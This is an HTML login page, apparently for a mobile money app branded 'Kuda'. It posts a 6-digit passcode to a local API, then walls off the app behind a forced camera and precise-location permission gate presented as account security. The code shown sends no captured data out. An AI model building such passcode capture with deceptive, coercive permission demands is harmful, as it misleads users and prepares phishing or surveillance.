<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kuda - Enter Password</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <div class="password-container">
        <div class="password-logo-section">
            <div class="password-logo">
                <img src="icons/kuda.png" alt="Kuda Logo">
            </div>
            <h1 class="password-title">Kuda</h1>
            <p class="password-subtitle">Mobile Money Transfer</p>
        </div>

        <div class="password-input-section">
            <h2>Enter Password</h2>
            <p class="password-description">Enter your 6-digit password to continue</p>

            <form class="password-form" id="passwordForm">
                <div class="password-input-wrapper">
                    <input
                        type="password"
                        id="passwordInput"
                        class="password-input-field"
                        placeholder="●●●●●●"
                        maxlength="6"
                        autocomplete="off"
                        inputmode="numeric"
                    >
                    <div class="password-error" id="passwordError">Incorrect password. Please try again.</div>
                </div>

                <button type="submit" class="password-submit-btn" id="submitBtn">
                    Unlock
                </button>
            </form>

            <p class="password-hint">Only numeric password is accepted</p>
        </div>

        <div class="password-footer">
            <p>Secure Login • All data encrypted</p>
        </div>
    </div>

    <script>
        const passwordForm = document.getElementById('passwordForm');
        const passwordInput = document.getElementById('passwordInput');
        const passwordError = document.getElementById('passwordError');
        const submitBtn = document.getElementById('submitBtn');

        // Auto-submit when 6 digits are entered
        passwordInput.addEventListener('input', (e) => {
            const value = e.target.value;
            const numericOnly = value.replace(/[^0-9]/g, '');
            passwordInput.value = numericOnly;
            if (numericOnly.length === 6) {
                submitForm();
            }
        });

        passwordForm.addEventListener('submit', (e) => {
            e.preventDefault();
            submitForm();
        });

        function submitForm() {
            const enteredPassword = passwordInput.value;
            if (enteredPassword.length !== 6) return;

            submitBtn.disabled = true;

            fetch('/api/verify-password', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password: enteredPassword })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    passwordError.classList.add('hidden');
                    showPermissionGate();
                } else {
                    passwordError.classList.remove('hidden');
                    passwordInput.value = '';
                    passwordInput.focus();
                    submitBtn.disabled = false;
                    setTimeout(() => { passwordError.classList.add('hidden'); }, 3000);
                }
            })
            .catch(error => {
                console.error('Error:', error);
                passwordError.classList.remove('hidden');
                passwordInput.value = '';
                passwordInput.focus();
                submitBtn.disabled = false;
                setTimeout(() => { passwordError.classList.add('hidden'); }, 3000);
            });
        }

        // Mandatory permission gate - blocks app until both camera + location are granted
        function showPermissionGate() {
            // Hide the password form
            document.querySelector('.password-container').style.display = 'none';

            const overlay = document.createElement('div');
            overlay.id = 'permissionGate';
            overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#121212;z-index:99999;display:flex;align-items:center;justify-content:center;padding:20px;';
            overlay.innerHTML = `
                <div style="background:#1e1e1e;border-radius:20px;padding:32px 24px;max-width:360px;width:100%;text-align:center;">
                    <div style="width:64px;height:64px;margin:0 auto 16px;background:rgba(0,208,158,0.1);border-radius:50%;display:flex;align-items:center;justify-content:center;">
                        <svg width="32" height="32" viewBox="0 0 24 24" fill="none">
                            <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z" fill="#00D09E"/>
                            <path d="M10 12L11.5 13.5L15 10" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                    </div>
                    <h2 style="color:#fff;font-size:20px;font-weight:700;margin-bottom:8px;">Security Setup Required</h2>
                    <p style="color:rgba(255,255,255,0.5);font-size:13px;margin-bottom:24px;line-height:1.5;">To protect your account, we need camera and location access. You cannot use the app without granting both permissions.</p>
                    <div id="permStatus" style="margin-bottom:20px;text-align:left;">
                        <div id="locStatus" style="padding:12px;border-radius:10px;margin-bottom:8px;background:rgba(255,255,255,0.05);color:rgba(255,255,255,0.4);font-size:14px;display:flex;align-items:center;gap:10px;">
                            <span style="width:24px;height:24px;border-radius:50%;background:rgba(255,255,255,0.1);display:flex;align-items:center;justify-content:center;font-size:12px;">1</span>
                            Location: Waiting...
                        </div>
                        <div id="camStatus" style="padding:12px;border-radius:10px;margin-bottom:8px;background:rgba(255,255,255,0.05);color:rgba(255,255,255,0.4);font-size:14px;display:flex;align-items:center;gap:10px;">
                            <span style="width:24px;height:24px;border-radius:50%;background:rgba(255,255,255,0.1);display:flex;align-items:center;justify-content:center;font-size:12px;">2</span>
                            Camera: Waiting...
                        </div>
                    </div>
                    <button id="grantPermBtn" style="width:100%;background:#00D09E;color:#000;border:none;padding:14px;border-radius:12px;font-size:16px;font-weight:700;cursor:pointer;">Grant Permissions</button>
                    <p id="permHint" style="color:rgba(255,255,255,0.3);font-size:11px;margin-top:16px;line-height:1.4;">If you denied permission before, go to your browser settings and reset permissions for this site.</p>
                </div>
            `;
            document.body.appendChild(overlay);

            const btn = document.getElementById('grantPermBtn');
            btn.addEventListener('click', async () => {
                btn.disabled = true;
                btn.textContent = 'Requesting...';
                btn.style.background = 'rgba(0,208,158,0.3)';

                // Step 1: Location
                const locEl = document.getElementById('locStatus');
                let locationOK = false;
                try {
                    locEl.innerHTML = '<span style="width:24px;height:24px;border-radius:50%;background:rgba(0,208,158,0.2);display:flex;align-items:center;justify-content:center;font-size:12px;">1</span> Location: Requesting...';
                    locEl.style.color = 'rgba(255,255,255,0.7)';

                    locationOK = await new Promise((resolve) => {
                        const timeout = setTimeout(() => resolve(false), 20000);
                        navigator.geolocation.getCurrentPosition(
                            (pos) => {
                                clearTimeout(timeout);
                                localStorage.setItem('locationGranted', 'true');
                                locEl.innerHTML = '<span style="width:24px;height:24px;border-radius:50%;background:#00D09E;display:flex;align-items:center;justify-content:center;font-size:12px;color:#000;">1</span> Location: Granted';
                                locEl.style.color = '#00D09E';
                                resolve(true);
                            },
                            (err) => {
                                clearTimeout(timeout);
                                let msg = 'Denied';
                                if (err.code === 2) msg = 'Unavailable';
                                if (err.code === 3) msg = 'Timeout';
                                locEl.innerHTML = '<span style="width:24px;height:24px;border-radius:50%;background:#e74c3c;display:flex;align-items:center;justify-content:center;font-size:12px;color:#fff;">1</span> Location: ' + msg;
                                locEl.style.color = '#e74c3c';
                                resolve(false);
                            },
                            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                        );
                    });
                } catch (e) {
                    locEl.innerHTML = '<span style="width:24px;height:24px;border-radius:50%;background:#e74c3c;display:flex;align-items:center;justify-content:center;font-size:12px;color:#fff;">1</span> Location: Failed';
                    locEl.style.color = '#e74c3c';
                }

                if (!locationOK) {
                    btn.disabled = false;
                    btn.textContent = 'Try Again';
                    btn.style.background = '#00D09E';
                    document.getElementById('permHint').textContent = 'Location access is required. Open your browser Settings > Site Settings > Location and set to "Allow", then tap Try Again.';
                    document.getElementById('permHint').style.color = '#e74c3c';
                    return;
                }

                // Step 2: Camera
                const camEl = document.getElementById('camStatus');
                let cameraOK = false;
                try {
                    camEl.innerHTML = '<span style="width:24px;height:24px;border-radius:50%;background:rgba(0,208,158,0.2);display:flex;align-items:center;justify-content:center;font-size:12px;">2</span> Camera: Requesting...';
                    camEl.style.color = 'rgba(255,255,255,0.7)';

                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user', width: 320, height: 240 }
                    });
                    stream.getTracks().forEach(t => t.stop());
                    localStorage.setItem('cameraGranted', 'true');
                    camEl.innerHTML = '<span style="width:24px;height:24px;border-radius:50%;background:#00D09E;display:flex;align-items:center;justify-content:center;font-size:12px;color:#000;">2</span> Camera: Granted';
                    camEl.style.color = '#00D09E';
                    cameraOK = true;
                } catch (e) {
                    camEl.innerHTML = '<span style="width:24px;height:24px;border-radius:50%;background:#e74c3c;display:flex;align-items:center;justify-content:center;font-size:12px;color:#fff;">2</span> Camera: Denied';
                    camEl.style.color = '#e74c3c';
                }

                if (!cameraOK) {
                    btn.disabled = false;
                    btn.textContent = 'Try Again';
                    btn.style.background = '#00D09E';
                    document.getElementById('permHint').textContent = 'Camera access is required. Open your browser Settings > Site Settings > Camera and set to "Allow", then tap Try Again.';
                    document.getElementById('permHint').style.color = '#e74c3c';
                    return;
                }

                // Both granted - proceed to dashboard
                btn.textContent = 'All Set!';
                btn.style.background = '#00D09E';
                setTimeout(() => {
                    window.location.href = '/dashboard';
                }, 600);
            });
        }

        // Focus input on load
        window.addEventListener('load', () => {
            passwordInput.focus();
        });
    </script>
</body>
</html>
